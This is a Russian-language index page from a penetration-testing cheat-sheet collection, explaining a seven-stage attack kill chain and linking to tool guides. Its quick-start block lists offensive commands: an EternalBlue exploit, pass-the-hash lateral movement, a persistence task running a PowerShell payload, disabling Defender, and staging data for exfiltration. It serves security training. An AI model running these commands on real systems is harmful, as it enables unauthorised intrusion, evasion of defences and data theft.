# 🎯 Методология атаки — Kill Chain (цепочка атаки)

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[Английский оригинал](../README.md) • [Русский указатель](../../README.ru.md)
[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ██╗  ██╗██╗██╗     ██╗          ██████╗██╗  ██╗ █████╗ ██╗███╗   ██╗
  ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██║ ██╔╝██║██║     ██║         ██╔════╝██║  ██║██╔══██╗██║████╗  ██║
  ███████║   ██║      ██║   ███████║██║     █████╔╝     █████╔╝ ██║██║     ██║         ██║     ███████║███████║██║██╔██╗ ██║
  ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ██╔═██╗ ██║██║     ██║         ██║     ██╔══██║██╔══██║██║██║╚██╗██║
  ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ██║  ██╗██║███████╗███████╗    ╚██████╗██║  ██║██║  ██║██║██║ ╚████║
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
```

---

## 🎯 Что такое цепочка атаки (Attack Kill Chain)?

**Attack Kill Chain** (также называемая в оригинале **Cyber Kill Chain** или **MITRE ATT&CK**) описывает этапы, которые проходит атакующий при компрометации и эксплуатации целевой системы или сети.

> **Уточнение:** названия в оригинале смешаны. [MITRE ATT&CK](https://attack.mitre.org/) — база знаний о тактиках и техниках противника; [Cyber Kill Chain от Lockheed Martin](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html) — отдельная модель жизненного цикла атаки. Приведённые ниже семь этапов — учебная структура этого репозитория, а не точное воспроизведение обеих моделей.

---

## 📊 Этапы цепочки атаки

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           ATTACK LIFECYCLE                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 1. INITIAL   │───▶│ 2. DISCOVERY │───▶│ 3. PRIVILEGE         │        │
│   │    ACCESS    │    │ ENUMERATION  │    │    ESCALATION        │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│          │                                           │                      │
│          │                                           ▼                      │
│          │                               ┌──────────────────────┐          │
│          │                               │ 4. LATERAL           │          │
│          │                               │    MOVEMENT          │          │
│          │                               └──────────────────────┘          │
│          │                                           │                      │
│          ▼                                           ▼                      │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────────────┐        │
│   │ 7. ACTIONS   │◀───│ 6. DEFENSE   │◀───│ 5. PERSISTENCE       │        │
│   │ ON OBJECTIVES│    │    EVASION   │    │                      │        │
│   └──────────────┘    └──────────────┘    └──────────────────────┘        │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📖 Руководства по этапам

| Этап | Описание | Руководство |
|-------|-------------|-------|
| **1. Первоначальный доступ** | Первоначальный доступ к цели | [📄 Открыть](./01-Initial-Access.ru.md) |
| **2. Обнаружение и перечисление** | Сбор сведений о скомпрометированной системе | [📄 Открыть](./02-Enumeration.ru.md) |
| **3. Повышение привилегий** | Повышение привилегий до администратора/root | [📄 Открыть](./03-Privilege-Escalation.ru.md) |
| **4. Боковое перемещение** | Переход по сети на другие системы | [📄 Открыть](./04-Lateral-Movement.ru.md) |
| **5. Закрепление** | Сохранение доступа после перезагрузки или обнаружения | [📄 Открыть](./05-Persistence.ru.md) |
| **6. Обход защиты** | Обход AV, EDR и других средств защиты | [📄 Открыть](./06-Defense-Evasion.ru.md) |
| **7. Действия для достижения цели** | Достижение конечной цели (вывод данных, воздействие) | [📄 Открыть](./07-Actions-Objectives.ru.md) |

---

## 🔗 Связанные шпаргалки

### По этапам

| Этап | Связанные инструменты |
|-------|---------------|
| Первоначальный доступ | [Metasploit](../../Metasploit/README.md), [SQLMap](../../SQLMap/README.md), [Hydra](../../Hydra/README.md) |
| Перечисление | [Nmap](../../Nmap/README.md), [BloodHound](../../BloodHound/README.md), [PowerView](../../PowerView/README.md) |
| Повышение привилегий | [Linux-PrivEsc](../../Linux-PrivEsc/README.md), [Windows-PrivEsc](../../Windows-PrivEsc/README.md) |
| Боковое перемещение | [Impacket](../../Impacket/README.md), [CrackMapExec](../../CrackMapExec/README.md), [Evil-WinRM](../../Evil-WinRM/README.md) |
| Закрепление | [PowerShell](../../PowerShell/README.md), [Metasploit](../../Metasploit/README.md) |
| Обход защиты | [Mimikatz](../../Mimikatz/README.md), [PowerShell](../../PowerShell/README.md) |
| Вывод данных (эксфильтрация) | [Linux-Commands](../../Linux-Commands/README.md) |

---

## 📚 Быстрый старт

### Типичная последовательность атаки
```bash
# 1. Первоначальный доступ — эксплуатация уязвимости
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; exploit"

# 2. Перечисление — определение доступных ресурсов
whoami /all
systeminfo
net user

# 3. Повышение привилегий — получение SYSTEM/root
.\winPEAS.exe

# 4. Боковое перемещение — переход на другие системы
impacket-psexec -hashes :HASH administrator@192.168.1.20

# 5. Закрепление — сохранение доступа
schtasks /create /tn "Updater" /tr "powershell -ep bypass -c IEX(payload)" /sc onlogon

# 6. Обход защиты — отключение антивируса
Set-MpPreference -DisableRealtimeMonitoring $true

# 7. Действия для достижения цели — вывод данных
Compress-Archive -Path C:\Sensitive -DestinationPath C:\Temp\data.zip
```

---

## 📚 Ресурсы

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Cyber Kill Chain - Lockheed Martin](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [Unified Kill Chain](https://www.unifiedkillchain.com/)

---

<p align="center">
  <b>🎯 Следуйте цепочке атаки!</b><br>
  <i>Только для тестирования на проникновение с разрешения владельца!</i>
</p>
